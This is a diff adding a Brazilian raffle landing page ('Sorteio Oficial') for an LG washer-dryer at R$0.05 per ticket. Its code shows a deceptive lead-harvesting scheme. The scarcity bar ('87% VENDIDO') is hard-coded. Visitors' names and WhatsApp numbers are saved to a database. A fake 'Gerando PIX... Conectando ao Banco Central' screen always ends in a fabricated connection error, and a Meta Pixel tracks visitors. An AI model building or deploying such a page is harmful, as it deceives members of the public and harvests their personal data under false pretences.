@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sorteio Oficial</title>
+    
+    <!-- React & Tailwind -->
+    <script src="https://unpkg.com/react@18/umd/react.development.js" crossorigin></script>
+    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js" crossorigin></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+    <style>
+        body { -webkit-tap-highlight-color: transparent; }
+        @keyframes pulse-custom { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.02); } }
+        .animate-pulse-btn { animation: pulse-custom 1.5s infinite; }
+        .bg-pattern { background-color: #f3f4f6; }
+        @media (min-width: 768px) {
+            .bg-pattern {
+                background-color: #4c1d95;
+                background-image: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%239c92ac' fill-opacity='0.1'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+            }
+        }
+        .shine {
+            background: linear-gradient(to right, transparent 0%, rgba(255,255,255,0.4) 50%, transparent 100%);
+            background-size: 200% 100%;
+            animation: shine 2s infinite linear;
+        }
+        @keyframes shine { from { background-position: -200% 0; } to { background-position: 200% 0; } }
+    </style>
+</head>
+<body class="bg-pattern font-sans antialiased text-gray-900">
+    <div id="root"></div>
+
+    <script type="text/babel">
+        // --- CONFIGURAÇÃO ---
+        const config = {
+            supabaseUrl: 'https://nlgcliekkvipasdnlsgu.supabase.co', 
+            supabaseKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5sZ2NsaWVra3ZpcGFzZG5sc2d1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzEzNjY4MDQsImV4cCI6MjA4Njk0MjgwNH0.LA1bvaRpDLelyHNA5u0RjynNm241_7zeKdrx9L_hsTY',
+            productImage: './imagens/lg.png', 
+            ticketPrice: 0.05
+        };
+
+        const supabase = config.supabaseUrl.includes('http') 
+            ? window.supabase.createClient(config.supabaseUrl, config.supabaseKey)
+            : null;
+
+        const App = () => {
+            const [view, setView] = React.useState('landing');
+            const [tickets, setTickets] = React.useState(100);
+            const [purchaseDetails, setPurchaseDetails] = React.useState({ tickets: 0, value: 0 });
+            
+            const [name, setName] = React.useState('');
+            const [phone, setPhone] = React.useState('');
+            const [isSubmitting, setIsSubmitting] = React.useState(false);
+
+            React.useEffect(() => {
+                if(supabase) supabase.from('analytics').insert({ event_type: 'page_view' }).then();
+                const interval = setInterval(() => { if (window.lucide) window.lucide.createIcons(); }, 1000);
+                return () => clearInterval(interval);
+            }, []);
+
+            const addTickets = (amount) => {
+                setTickets(prev => prev + amount);
+            };
+
+            const handleParticipate = () => {
+                const totalValue = tickets * config.ticketPrice;
+                setPurchaseDetails({ tickets, value: totalValue });
+                
+                if(supabase) supabase.from('analytics').insert({ 
+                    event_type: 'click_participate', 
+                    details: { tickets: tickets, value: totalValue } 
+                }).then();
+                
+                setView('form');
+            };
+
+            const handleLeadSubmit = (e) => {
+                e.preventDefault();
+                if(!name || phone.length < 10) return alert("Preencha os dados corretamente");
+                
+                // 1. Tela de Carregamento IMEDIATA
+                setView('processing');
+
+                // 2. Salva em background
+                if (supabase) {
+                    supabase.from('leads').insert({
+                        name: name,
+                        phone: phone,
+                        ticket_count: purchaseDetails.tickets,
+                        total_value: purchaseDetails.value,
+                        status: 'pix_attempted'
+                    }).then(() => console.log('Salvo')).catch(err => console.error(err));
+                }
+
+                // 3. Mostra o erro após 3 segundos
+                setTimeout(() => {
+                    setView('error');
+                }, 3000);
+            };
+
+            const handlePhoneMask = (e) => {
+                let v = e.target.value.replace(/\D/g, "");
+                v = v.replace(/^(\d\d)(\d)/g, "($1) $2");
+                v = v.replace(/(\d{5})(\d)/, "$1-$2");
+                setPhone(v.substring(0, 15));
+            };
+
+            // --- TELAS ---
+
+            // Tela de Processamento
+            if (view === 'processing') return (
+                <div className="fixed inset-0 bg-black/90 flex flex-col items-center justify-center z-50 text-white text-center p-4">
+                    <i data-lucide="loader" className="animate-spin w-16 h-16 mb-6 text-green-500"></i>
+                    <p className="text-2xl font-bold mb-2">Gerando PIX...</p>
+                    <p className="text-gray-400">Conectando ao Banco Central...</p>
+                    <p className="text-sm text-green-400 mt-4 font-mono">R$ {purchaseDetails.value.toFixed(2)}</p>
+                </div>
+            );
+
+            // Tela de Erro (Pop-up de Instabilidade)
+            if (view === 'error') return (
+                <div className="fixed inset-0 bg-black/90 backdrop-blur-sm flex flex-col items-center justify-center p-4 z-50">
+                    <div className="bg-white p-8 rounded-3xl shadow-2xl w-full max-w-sm text-center transform transition-all scale-100">
+                        <div className="w-20 h-20 bg-red-50 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6">
+                            <i data-lucide="server-off" className="w-10 h-10"></i>
+                        </div>
+                        
+                        <h2 className="text-2xl font-black text-gray-800 mb-2">ERRO DE CONEXÃO</h2>
+                        
+                        <p className="text-gray-600 mb-6 font-medium">
+                            Identificamos uma instabilidade no sistema de geração de PIX devido à alta demanda no momento.
+                        </p>
+                        
+                        <div className="bg-green-50 border border-green-100 p-4 rounded-xl mb-6 text-left">
+                            <div className="flex gap-2 mb-1">
+                                <i data-lucide="check-circle-2" className="w-5 h-5 text-green-600"></i>
+                                <h3 className="font-bold text-green-800 text-sm">Reserva Garantida!</h3>
+                            </div>
+                            <p className="text-green-700 text-xs pl-7 leading-tight">
+                                Seus dados foram salvos com sucesso. Por favor, tente realizar o pagamento novamente em alguns minutos.
+                            </p>
+                        </div>
+
+                        <button 
+                            onClick={() => window.location.reload()}
+                            className="w-full bg-red-600 text-white font-bold py-4 rounded-xl hover:bg-red-700 transition shadow-lg active:scale-95"
+                        >
+                            Tentar Novamente
+                        </button>
+                    </div>
+                </div>
+            );
+
+            if (view === 'form') return (
+                <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center p-4">
+                    <div className="bg-white p-6 rounded-2xl shadow-xl w-full max-w-md relative">
+                        <button onClick={() => setView('landing')} className="absolute top-4 left-4 text-gray-400 hover:text-gray-600"><i data-lucide="arrow-left" className="w-6 h-6"></i></button>
+                        <div className="text-center mb-6 mt-2">
+                            <div className="w-16 h-16 bg-purple-100 text-purple-600 rounded-full flex items-center justify-center mx-auto mb-3">
+                                <i data-lucide="user" className="w-8 h-8"></i>
+                            </div>
+                            <h2 className="text-2xl font-bold text-gray-800">Quase lá!</h2>
+                            <p className="text-gray-500 text-sm">Preencha para receber o código PIX.</p>
+                        </div>
+                        <div className="bg-purple-50 border border-purple-100 p-4 rounded-xl mb-6 flex justify-between items-center">
+                            <div>
+                                <p className="text-xs text-purple-800 font-bold uppercase">Pacote escolhido</p>
+                                <p className="text-lg font-black text-gray-800">{purchaseDetails.tickets} cotas</p>
+                            </div>
+                            <div className="text-right">
+                                <p className="text-xs text-purple-800 font-bold uppercase">Valor Total</p>
+                                <p className="text-2xl font-black text-green-600">{purchaseDetails.value.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}</p>
+                            </div>
+                        </div>
+                        <form onSubmit={handleLeadSubmit} className="space-y-4">
+                            <div>
+                                <label className="block text-xs font-bold text-gray-500 uppercase mb-1">Nome Completo</label>
+                                <input type="text" value={name} onChange={(e) => setName(e.target.value)} className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-purple-500 focus:bg-white outline-none transition font-medium" placeholder="Ex: João da Silva" required />
+                            </div>
+                            <div>
+                                <label className="block text-xs font-bold text-gray-500 uppercase mb-1">WhatsApp</label>
+                                <input type="tel" value={phone} onChange={handlePhoneMask} className="w-full p-4 bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-purple-500 focus:bg-white outline-none transition font-medium" placeholder="(11) 99999-9999" required />
+                            </div>
+                            <button type="submit" disabled={isSubmitting} className="w-full bg-green-500 hover:bg-green-600 text-white font-black text-lg py-4 rounded-xl shadow-lg flex justify-center items-center gap-2 transform active:scale-95 transition">
+                                PAGAR AGORA <i data-lucide="arrow-right" className="w-6 h-6"></i>
+                            </button>
+                        </form>
+                        <p className="text-center text-xs text-gray-400 mt-6 flex items-center justify-center gap-1"><i data-lucide="lock" className="w-3 h-3"></i> Ambiente criptografado e seguro.</p>
+                    </div>
+                </div>
+            );
+
+            // LANDING PAGE
+            return (
+                <div className="min-h-screen bg-gray-50 md:bg-pattern flex justify-center">
+                    <div className="w-full max-w-md bg-white shadow-2xl min-h-screen flex flex-col">
+                        
+                        {/* Imagem (Full Width & Auto Height) */}
+                        <div className="w-full relative bg-gray-100">
+                            <img 
+                                src={config.productImage} 
+                                alt="Prêmio" 
+                                className="w-full h-auto block" 
+                                onError={(e) => { e.target.onerror = null; e.target.src = 'https://via.placeholder.com/800x800?text=Imagem+Nao+Encontrada'; }}
+                            />
+                            {/* Preço flutuante MANTIDO */}
+                            <div className="absolute bottom-0 left-0 w-full bg-gradient-to-t from-black/80 to-transparent p-4 pt-12">
+                                <div className="inline-block bg-yellow-400 text-purple-900 text-xs font-black px-3 py-1 rounded transform -rotate-1 mb-1 shadow-lg">
+                                    POR APENAS R$ {config.ticketPrice.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}
+                                </div>
+                                <h2 className="text-white text-xl font-bold leading-tight drop-shadow-md">Lava e Seca LG Smart 18kg</h2>
+                            </div>
+                        </div>
+
+                        <div className="flex-1 p-5 space-y-6 pb-10">
+                            {/* Prova Social */}
+                            <div className="bg-red-50 border border-red-100 p-3 rounded-lg flex items-center gap-3 animate-pulse">
+                                <div className="bg-red-500 text-white rounded-full p-1"><i data-lucide="clock" className="w-4 h-4"></i></div>
+                                <p className="text-red-700 text-sm font-bold">Corre! Restam poucas cotas disponíveis.</p>
+                            </div>
+
+                            {/* Barra Progresso */}
+                            <div className="w-full bg-gray-200 rounded-full h-4 mb-4 border border-gray-300 shadow-inner relative overflow-hidden">
+                                <div className="bg-gradient-to-r from-green-400 to-green-600 h-full rounded-full transition-all duration-1000 relative" style={{ width: '87%' }}><div className="absolute inset-0 shine"></div></div>
+                                <span className="absolute inset-0 flex items-center justify-center text-[10px] font-bold text-gray-800 drop-shadow-sm">87% VENDIDO</span>
+                            </div>
+
+                            {/* SELETOR DE COTAS ACUMULATIVO */}
+                            <div className="bg-white p-5 rounded-2xl border-2 border-dashed border-gray-300 shadow-sm">
+                                <p className="text-center font-bold text-gray-700 mb-4 text-xs uppercase tracking-widest">Adicionar Cotas</p>
+                                
+                                <div className="grid grid-cols-2 gap-3 mb-6">
+                                    <button onClick={() => addTickets(100)} className="py-3 rounded-xl border-2 border-gray-100 bg-gray-50 hover:border-purple-500 hover:bg-purple-50 hover:text-purple-700 text-gray-600 transition font-bold relative active:scale-95">
+                                        +100 <span className="block text-[10px] font-normal opacity-70">R$ {(100 * config.ticketPrice).toFixed(2)}</span>
+                                    </button>
+                                    <button onClick={() => addTickets(200)} className="py-3 rounded-xl border-2 border-gray-100 bg-gray-50 hover:border-purple-500 hover:bg-purple-50 hover:text-purple-700 text-gray-600 transition font-bold relative active:scale-95">
+                                        +200 <span className="block text-[10px] font-normal opacity-70">R$ {(200 * config.ticketPrice).toFixed(2)}</span>
+                                    </button>
+                                    <button onClick={() => addTickets(500)} className="py-3 rounded-xl border-2 border-green-500 bg-green-50 text-green-700 transition font-bold relative active:scale-95 shadow-sm">
+                                        <span className="absolute -top-2.5 right-2 bg-yellow-400 text-purple-900 text-[8px] font-black px-2 py-0.5 rounded-full uppercase tracking-wider shadow-sm">Popular</span>
+                                        +500 <span className="block text-[10px] font-normal opacity-70">R$ {(500 * config.ticketPrice).toFixed(2)}</span>
+                                    </button>
+                                    <button onClick={() => addTickets(1000)} className="py-3 rounded-xl border-2 border-gray-100 bg-gray-50 hover:border-purple-500 hover:bg-purple-50 hover:text-purple-700 text-gray-600 transition font-bold relative active:scale-95">
+                                        +1000 <span className="block text-[10px] font-normal opacity-70">R$ {(1000 * config.ticketPrice).toFixed(2)}</span>
+                                    </button>
+                                </div>
+
+                                {/* CONTADOR E BOTÃO LADO A LADO (NOVO) */}
+                                <div className="flex gap-3 items-stretch h-14">
+                                    {/* Contador Manual */}
+                                    <div className="flex-1 flex items-center justify-between bg-gray-50 p-1 rounded-xl border border-gray-200">
+                                        <button onClick={() => tickets > 1 && setTickets(tickets - 1)} className="w-8 h-full flex items-center justify-center bg-white rounded-lg shadow-sm text-gray-600 font-bold hover:bg-gray-100 active:scale-90 transition text-lg">-</button>
+                                        <div className="text-center px-2">
+                                            <span className="text-xl font-black text-gray-800 leading-none block">{tickets}</span>
+                                            <span className="text-[8px] text-gray-400 uppercase font-bold">Cotas</span>
+                                        </div>
+                                        <button onClick={() => setTickets(tickets + 1)} className="w-8 h-full flex items-center justify-center bg-white rounded-lg shadow-sm text-gray-600 font-bold hover:bg-gray-100 active:scale-90 transition text-lg">+</button>
+                                    </div>
+
+                                    {/* Botão Participar (Integrado) */}
+                                    <button 
+                                        onClick={handleParticipate}
+                                        className="flex-1 bg-green-500 hover:bg-green-600 text-white font-black text-lg rounded-xl shadow-xl border-b-4 border-green-700 active:border-b-0 active:translate-y-1 transition-all flex flex-col items-center justify-center animate-pulse-btn leading-none group px-2"
+                                    >
+                                        <span className="flex items-center gap-1 mb-1 text-sm">
+                                            PARTICIPAR <i data-lucide="chevron-right" className="w-4 h-4"></i>
+                                        </span>
+                                        <span className="text-xs font-medium opacity-90">
+                                            {(tickets * config.ticketPrice).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' })}
+                                        </span>
+                                    </button>
+                                </div>
+                            </div>
+
+                            <p className="text-center text-gray-400 text-xs mt-4 pb-4">
+                                Sorteio baseado na Loteria Federal.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            );
+        };
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
+    </script>
+
+    <!-- Meta Pixel Code -->
+<script>
+  !function(f,b,e,v,n,t,s)
+  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+  if(!f._fbq)f._fbq=n;
+  n.push=n;n.loaded=!0;n.version='2.0';
+  n.queue=[];t=b.createElement(e);t.async=!0;
+  t.src=v;s=b.getElementsByTagName(e)[0];
+  s.parentNode.insertBefore(t,s)}
+  (window, document,'script',
+  'https://connect.facebook.net/en_US/fbevents.js');
+
+  fbq('init', '1770548813906087'); 
+  fbq('track', 'PageView');
+</script>
+
+<noscript>
+  <img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=1770548813906087&ev=PageView&noscript=1"/>
+</noscript>
+<!-- End Meta Pixel Code -->
+
+
+</body>
+</html>
